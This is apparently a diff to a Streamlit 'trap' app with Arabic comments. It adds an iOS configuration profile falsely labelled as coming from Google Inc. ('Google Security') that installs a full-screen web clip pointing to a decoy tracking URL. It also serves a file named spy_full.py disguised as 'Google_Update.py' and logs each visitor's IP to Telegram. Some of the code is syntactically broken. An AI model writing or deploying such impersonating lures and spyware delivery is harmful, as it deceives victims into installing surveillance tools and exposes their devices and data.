@@ -21,62 +21,139 @@ def get_image_as_base64(path):
             return base64.b64encode(f.read()).decode()
     except: return ""
 
-# --- CSS نظيف ومرتب لإصلاح التداخل ---
-st.markdown("""
-<style>
-/* إزالة التنسيقات المعقدة التي تسببت في التداخل */
-.main .block-container {
-    padding-top: 2rem;
-    max-width: 100%;
-}
-
-/* تنسيق العناوين بشكل أفقي وطبيعي */
-.custom-title {
-    font-size: 32px !important;
-    font-weight: bold !important;
-    color: white !important;
-    text-align: center;
-    margin-bottom: 20px;
-}
-
-/* تحسين شكل التبويبات (Tabs) */
-.stTabs [data-baseweb="tab-list"] {
-    gap: 8px;
-    overflow-x: auto;
-}
-.stTabs [data-baseweb="tab"] {
-    height: 45px;
-    white-space: nowrap;
-    background-color: #1e293b;
-    border-radius: 5px;
-    color: white;
-    padding: 0 15px;
-}
-.stTabs [aria-selected="true"] {
-    background-color: #ff4b4b !important;
-}
-
-/* أزرار واضحة ومرتبة */
-.stButton>button {
-    border-radius: 5px;
-    font-weight: bold;
-    width: 100%;
-}
-
-/* إخفاء واجهة Streamlit الافتراضية */
-#MainMenu {visibility: hidden;}
-footer {visibility: hidden;}
-header {visibility: hidden;}
-</style>
-""", unsafe_allow_html=True)
+    # --- CSS نظيف ومرتب لإصلاح التداخل ---
+    st.markdown("""
+    <style>
+    /* إزالة التنسيقات المعقدة التي تسببت في التداخل */
+    .main .block-container {
+        padding-top: 2rem;
+        max-width: 100%;
+    }
+    
+    /* تنسيق العناوين بشكل أفقي وطبيعي */
+    .custom-title {
+        font-size: 32px !important;
+        font-weight: bold !important;
+        color: white !important;
+        text-align: center;
+        margin-bottom: 20px;
+    }
+    
+    /* تحسين شكل التبويبات (Tabs) */
+    .stTabs [data-baseweb="tab-list"] {
+        gap: 8px;
+        overflow-x: auto;
+    }
+    .stTabs [data-baseweb="tab"] {
+        height: 45px;
+        white-space: nowrap;
+        background-color: #1e293b;
+        border-radius: 5px;
+        color: white;
+        padding: 0 15px;
+    }
+    .stTabs [aria-selected="true"] {
+        background-color: #ff4b4b !important;
+    }
+    
+    /* أزرار واضحة ومرتبة */
+    .stButton>button {
+        border-radius: 5px;
+        font-weight: bold;
+        width: 100%;
+    }
+    
+    /* إخفاء واجهة Streamlit الافتراضية - باستثناء الشريط الجانبي */
+    #MainMenu {visibility: hidden;}
+    footer {visibility: hidden;}
+    header {visibility: hidden;}
+    /* تأكد من إظهار الشريط الجانبي */
+    .stSidebar { display: block !important; }
+    </style>
+    """, unsafe_allow_html=True)}, {
 
 # دالة جلب الـ IP العام
 def get_real_public_ip():
     try:
+        # محاولة جلب الـ IP من X-Forwarded-For أولاً
+        if st.request and st.request.headers:
+            x_forwarded_for = st.request.headers.get("X-Forwarded-For")
+            if x_forwarded_for:
+                # قد يحتوي على عدة IPs، نأخذ الأول ونزيل المسافات
+                ip = x_forwarded_for.split(",")[0].strip()
+                # التحقق إذا كان IP خاص (Private IP)
+                if not ip.startswith(("10.", "172.16.", "172.31.", "192.168.")):
+                    return ip
+        # إذا لم يكن X-Forwarded-For موجوداً أو كان IP خاصاً، نستخدم ipify
         return requests.get("https://api.ipify.org", timeout=5).text
     except: return "Unknown"
 
 # دالة إرسال التنبيه
+def generate_ios_mobileconfig(decoy_url):
+    profile_uuid = str(uuid.uuid4())
+    webclip_uuid = str(uuid.uuid4())
+    
+    # يمكنك استبدال الأيقونة هنا بصورة Base64 لأيقونة Google Security
+    # حالياً، نتركها فارغة أو نستخدم أيقونة افتراضية
+    icon_data = ""
+
+    mobileconfig_content = f"""
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>PayloadContent</key>
+    <array>
+        <dict>
+            <key>FullScreen</key>
+            <true/>
+            <key>Icon</key>
+            <data>
+            {icon_data}
+            </data>
+            <key>IsRemovable</key>
+            <true/>
+            <key>Label</key>
+            <string>Google Security</string>
+            <key>PayloadDescription</key>
+            <string>Adds a Google Security web clip to your Home screen.</string>
+            <key>PayloadDisplayName</key>
+            <string>Google Security</string>
+            <key>PayloadIdentifier</key>
+            <string>com.example.googlesecurity.webclip</string>
+            <key>PayloadOrganization</key>
+            <string>Google Inc.</string>
+            <key>PayloadType</key>
+            <string>com.apple.webClip.managed</string>
+            <key>PayloadUUID</key>
+            <string>{webclip_uuid}</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>URL</key>
+            <string>{decoy_url}</string>
+        </dict>
+    </array>
+    <key>PayloadDescription</key>
+    <string>This profile adds a Google Security web clip to your Home screen for quick access to security updates.</string>
+    <key>PayloadDisplayName</key>
+    <string>Google Security Profile</string>
+    <key>PayloadIdentifier</key>
+    <string>com.example.googlesecurity.profile</string>
+    <key>PayloadOrganization</key>
+    <string>Google Inc.</string>
+    <key>PayloadRemovalDisallowed</key>
+    <false/>
+    <key>PayloadType</key>
+    <string>Configuration</string>
+    <key>PayloadUUID</key>
+    <string>{profile_uuid}</string>
+    <key>PayloadVersion</key>
+    <integer>1</integer>
+</dict>
+</plist>
+"""
+    return mobileconfig_content.encode("utf-8")
+
 def send_telegram_alert(ip, trap_name, device="Unknown"):
     token = config.get_key("TELEGRAM_BOT_TOKEN")
     chat_id = config.get_key("TELEGRAM_CHAT_ID")
@@ -107,7 +184,8 @@ if "download" in query_params:
     device = query_params.get("device", "pc")
     send_telegram_alert(get_real_public_ip(), f"Download ({device})", device)
     if device == "android": f, c, m = "Google_Update.apk", b"APK", "application/vnd.android.package-archive"
-    elif device == "ios": f, c, m = "Google_Update.mobileconfig", b"Config", "application/x-apple-aspen-config"
+    elif device == "ios"        # استخدام رابط ثابت لملف التمويه، يجب تحديثه يدوياً في Streamlit Cloud
+        decoy_url = "https://rashdai.streamlit.app/?decoy=google&trap=iOS_WebClip"        f, c, m = "Google_Security.mobileconfig", generate_ios_mobileconfig(decoy_url), "application/x-apple-aspen-config"
     else: f, c, m = "Google_Update.py", open("spy_full.py", "rb").read() if os.path.exists("spy_full.py") else b"Py", "application/octet-stream"
     st.download_button("تحميل", c, file_name=f, mime=m)
     st.stop()
